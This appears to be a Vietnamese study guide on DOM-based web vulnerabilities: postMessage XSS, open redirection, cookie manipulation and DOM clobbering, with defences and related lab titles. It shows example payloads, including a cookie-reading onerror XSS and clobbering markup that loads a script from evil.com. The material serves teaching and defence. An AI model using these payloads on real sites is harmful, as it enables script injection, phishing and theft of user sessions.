
# DOM-BASED VULNERABILITIES — KIẾN THỨC TỔNG HỢP

## Mục lục
1. [Tổng quan DOM-based vulnerability](#1-tổng-quan-dom-based-vulnerability)
2. [Web messages (postMessage) không an toàn](#2-web-messages-postmessage-không-an-toàn)
3. [DOM-based open redirection](#3-dom-based-open-redirection)
4. [DOM-based cookie manipulation](#4-dom-based-cookie-manipulation)
5. [DOM clobbering](#5-dom-clobbering)
6. [Cách phòng chống](#6-cách-phòng-chống)
7. [Danh sách lab liên quan](#7-danh-sách-lab-liên-quan)

## 1. Tổng quan DOM-based vulnerability

Nhóm lỗ hổng phát sinh hoàn toàn từ xử lý phía client (JavaScript), không cần server tham gia xử lý sai. Đã đề cập DOM XSS ở topic XSS; ở đây tập trung vào các dạng DOM-based khác: web message không an toàn, open redirect, cookie manipulation, DOM clobbering.

## 2. Web messages (postMessage) không an toàn

`window.postMessage()` cho phép giao tiếp giữa các cửa sổ/iframe khác origin. Lỗ hổng xảy ra khi bên nhận **không kiểm tra `event.origin`** trước khi xử lý dữ liệu nhận được:

```js
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data; // không check e.origin!
});
```

Attacker có thể tạo iframe chứa trang victim rồi gửi message độc hại:
```js
var win = document.getElementById('victim-iframe').contentWindow;
win.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
```

**Biến thể:**
- Message chứa **JavaScript URL** được gán vào `location`/`src` → XSS qua `javascript:` scheme.
- Message được xử lý bằng `JSON.parse()` không kiểm soát → nếu kết quả parse được dùng cho sink nguy hiểm (`eval`, `innerHTML`) → XSS.

## 3. DOM-based open redirection

Xảy ra khi JS đọc dữ liệu từ nguồn không tin cậy (URL param, fragment) rồi gán trực tiếp vào `location`/`window.location.href` mà không validate domain đích:

```js
var url = new URLSearchParams(window.location.search).get('returnUrl');
if (url) { location = url; }
```
Payload: `?returnUrl=https://evil.com` — dùng để lừa phishing hoặc kết hợp làm bước trung gian cho tấn công khác (OAuth token theft, SameSite bypass...).

## 4. DOM-based cookie manipulation

Xảy ra khi JS gán dữ liệu không tin cậy trực tiếp vào `document.cookie` mà không sanitize, cho phép attacker tiêm thêm cookie tuỳ ý (hoặc ghi đè cookie hiện có) thông qua tham số URL, ảnh hưởng tới logic phía server dựa vào cookie đó (ví dụ theo dõi phiên, A/B testing ảnh hưởng nội dung hiển thị).

## 5. DOM clobbering

Kỹ thuật lợi dụng cách trình duyệt tự động biến các phần tử HTML có `id`/`name` thành **biến global** (hoặc property của 1 object khác) khi JS chưa gán giá trị cho biến đó — dùng để "ghi đè" (clobber) 1 biến JS mà attacker không kiểm soát trực tiếp qua injection thông thường (ví dụ khi mọi thẻ `<script>` bị lọc sạch nhưng vẫn chèn được các thẻ HTML khác):

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=href href="https://evil.com/malicious.js">
```

Nếu code JS gốc kiểm tra:
```js
if (!defaultAvatar) { defaultAvatar = {href: '/default.png'}; }
loadScript(defaultAvatar.href);
```
Do thẻ `<a>` với `id=defaultAvatar` đã tồn tại sẵn trong DOM (biến global `defaultAvatar` trỏ tới chính phần tử `<a>` đó, không phải `undefined`) → điều kiện `!defaultAvatar` bị bỏ qua, và `defaultAvatar.href` đọc thuộc tính `href` thật của thẻ `<a>` (trỏ tới URL attacker kiểm soát) → khiến code load script độc hại.

**Clobbering để bypass HTML sanitizer:** một số sanitizer output attribute nhưng không nhận diện được prototype bị "clobber" qua các thẻ lồng nhau đặc biệt (`<form>`, `<output>` name trùng thuộc tính chuẩn của DOM) khiến hàm kiểm tra nội bộ của sanitizer trả về sai kết quả, cho phép 1 số attribute nguy hiểm lọt qua.

## 6. Cách phòng chống

- Luôn kiểm tra `event.origin` (và tốt nhất `event.source`) trong handler `message`, chỉ chấp nhận origin đã whitelist.
- Không gán trực tiếp dữ liệu URL-controlled vào `location` mà không validate domain đích (whitelist domain hoặc chỉ cho phép relative path).
- Không gán dữ liệu không tin cậy trực tiếp vào `document.cookie`.
- Đặt tên biến/khởi tạo tường minh trước khi dùng (`var x = window.x || defaultValue` dễ bị clobber hơn `let x = defaultValue` khai báo rõ trong scope riêng); tránh dựa vào truthy-check đơn giản với biến có thể trùng tên với `id` HTML.
- Dùng sanitizer đã kiểm chứng kỹ (DOMPurify) thay vì tự viết, cập nhật thường xuyên để vá các kỹ thuật clobbering mới.

## 7. Danh sách lab liên quan

1. DOM XSS using web messages
2. DOM XSS using web messages and a JavaScript URL
3. DOM XSS using web messages and `JSON.parse`
4. DOM-based open redirection
5. DOM-based cookie manipulation
6. Exploiting DOM clobbering to enable XSS
7. Clobbering DOM attributes to bypass HTML filters
